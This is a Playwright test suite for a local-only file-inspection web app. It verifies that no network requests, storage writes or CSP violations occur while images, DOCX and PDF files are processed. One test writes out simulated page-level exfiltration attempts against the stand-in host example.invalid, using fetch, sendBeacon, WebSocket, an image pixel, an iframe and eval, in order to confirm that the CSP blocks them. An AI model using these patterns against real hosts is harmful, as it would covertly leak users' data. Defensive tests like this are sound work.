import { expect, test } from '@playwright/test';
import { auditBuild } from '../scripts/audit-build';
import { builtAssets, chooseFile, cleanupTempFiles, expectClean, fx, openApp, waitForResult, watch } from './support';

test.afterEach(() => cleanupTempFiles());

test.describe('local-only processing is enforced, not just claimed', () => {
  test('every flow still works when the browser blocks everything except the app\'s own built files', async ({ page, context }) => {
    const blocked: string[] = [];
    const assets = builtAssets();
    await context.route('**/*', (route) => {
      const u = new URL(route.request().url());
      const own = u.origin === 'http://127.0.0.1:4173' && (u.pathname === '/' || u.pathname === '/favicon.svg' || (u.pathname.startsWith('/assets/') && assets.has(u.pathname.slice(8))));
      if (own && route.request().method() === 'GET') return route.continue();
      blocked.push(`${route.request().method()} ${route.request().url()}`);
      return route.abort();
    });
    const w = await openApp(page);
    for (const f of ['jpeg-kitchen-sink.jpg', 'png-kitchen-sink.png']) {
      await chooseFile(page, fx(f));
      await waitForResult(page);
      await page.getByRole('button', { name: 'Create experimental copy' }).click();
      await expect(page.locator('.verdict[data-ok="true"]')).toBeVisible({ timeout: 30_000 });
      await page.getByRole('button', { name: 'Clear and start over' }).last().click();
    }
    for (const f of ['docx-embedded.docx', 'docx-macro.docx']) {
      await chooseFile(page, fx(f));
      await waitForResult(page);
      await page.getByRole('button', { name: 'Clear and start over' }).first().click();
    }
    for (const f of ['pdf-xmp.pdf', 'pdf-link-actions.pdf', 'pdf-javascript.pdf', 'pdf-attachment.pdf']) {
      await chooseFile(page, fx(f));
      await waitForResult(page);
      await expect(page.getByRole('heading', { level: 1 })).toHaveText('Inspection result');
      await page.getByRole('button', { name: 'Show page 1 as a picture' }).click();
      await expect(page.locator('.pdf-preview img')).toBeVisible({ timeout: 30_000 });
      await page.getByRole('button', { name: 'Clear and start over' }).first().click();
    }
    expect(blocked).toEqual([]);
    expect(await w.cspViolations()).toEqual([]);
    expectClean(w);
  });

  test('the CSP stops a page-level exfiltration attempt of any kind', async ({ page }) => {
    const w = await openApp(page);
    const results = await page.evaluate(async () => {
      const out: Record<string, string> = {};
      try {
        await fetch('https://example.invalid/?x=1');
        out.fetch = 'allowed';
      } catch {
        out.fetch = 'blocked';
      }
      try {
        out.beacon = navigator.sendBeacon('https://example.invalid/b', 'x') ? 'allowed' : 'blocked';
      } catch {
        out.beacon = 'blocked';
      }
      try {
        const ws = new WebSocket('wss://example.invalid/');
        out.websocket = await new Promise<string>((res) => {
          ws.onerror = () => res('blocked');
          ws.onopen = () => res('allowed');
          setTimeout(() => res('blocked'), 1500);
        });
      } catch {
        out.websocket = 'blocked';
      }
      const img = new Image();
      out.image = await new Promise<string>((res) => {
        img.onerror = () => res('blocked');
        img.onload = () => res('allowed');
        img.src = 'https://example.invalid/pixel.png';
        setTimeout(() => res('blocked'), 1500);
      });
      try {
        const f = document.createElement('iframe');
        f.src = 'https://example.invalid/';
        document.body.append(f);
        out.iframe = 'inserted';
      } catch {
        out.iframe = 'blocked';
      }
      try {
        new Function('return 1')();
        out.eval = 'allowed';
      } catch {
        out.eval = 'blocked';
      }
      return out;
    });
    expect(results).toMatchObject({ fetch: 'blocked', websocket: 'blocked', image: 'blocked', eval: 'blocked' });
    // sendBeacon returns true when the request is queued; the CSP then blocks it, which shows up as a violation.
    const violations = await w.cspViolations();
    expect(violations.join(' ')).toMatch(/connect-src/);
    expect(violations.join(' ')).toMatch(/img-src/);
    expect(violations.join(' ')).toMatch(/script-src/);
    expect(violations.join(' ')).toMatch(/frame-src|default-src/);
  });

  test('the worker script is served with the same restrictive CSP', async ({ page, request }) => {
    const w = await openApp(page);
    await chooseFile(page, fx('jpeg-gps.jpg'));
    await waitForResult(page);
    const workerUrl = w.requests.find((r) => /\/assets\/analysis\.worker-/.test(r.url))!.url;
    const res = await request.get(workerUrl);
    expect(res.headers()['content-security-policy']).toContain("connect-src 'none'");
    expect(res.headers()['content-security-policy']).not.toContain("'unsafe-eval'");
    expect(res.headers()['content-type']).toMatch(/javascript/);
    expect(res.headers()['x-content-type-options']).toBe('nosniff');
  });

  test('nothing is written to browser storage, caches, cookies or service workers', async ({ page, context }) => {
    await openApp(page);
    await chooseFile(page, fx('jpeg-kitchen-sink.jpg'));
    await waitForResult(page);
    await page.getByRole('button', { name: 'Create experimental copy' }).click();
    await expect(page.locator('.verdict')).toBeVisible({ timeout: 30_000 });
    await page.getByRole('button', { name: 'Clear and start over' }).last().click();
    await chooseFile(page, fx('pdf-xmp.pdf'));
    await waitForResult(page);
    const state = await page.evaluate(async () => ({
      local: localStorage.length,
      session: sessionStorage.length,
      cookie: document.cookie,
      caches: 'caches' in window ? (await caches.keys()).length : 0,
      databases: 'databases' in indexedDB ? (await indexedDB.databases()).length : 0,
      workers: (await navigator.serviceWorker?.getRegistrations?.())?.length ?? 0,
    }));
    expect(state).toEqual({ local: 0, session: 0, cookie: '', caches: 0, databases: 0, workers: 0 });
    expect(await context.cookies()).toEqual([]);
  });

  test('the production build contains no unexpected endpoints, inline code or leaked PDF tooling', () => {
    const r = auditBuild();
    expect(r.failures).toEqual([]);
    expect(r.ok).toBe(true);
  });

  test('requests made while a file is processed are a subset of the built static files', async ({ page }) => {
    const w = await openApp(page);
    const mark = w.mark();
    await chooseFile(page, fx('pdf-xmp.pdf'));
    await waitForResult(page);
    await page.getByRole('button', { name: 'Clear and start over' }).first().click();
    await chooseFile(page, fx('png-text.png'));
    await waitForResult(page);
    expect(w.unexpected(mark)).toEqual([]);
    // No request carries a body or a query string that could hold file-derived data.
    for (const r of w.since(mark)) {
      expect(r.method).toBe('GET');
      expect(r.hasBody).toBe(false);
      if (!r.url.startsWith('blob:')) expect(new URL(r.url).search).toBe('');
    }
  });
});

test('watch helper records dialogs and console problems (self-test)', async ({ page }) => {
  const w = await watch(page);
  await page.goto('/');
  await page.evaluate(() => console.error('probe'));
  expect(w.consoleProblems).toEqual(['error: probe']);
});
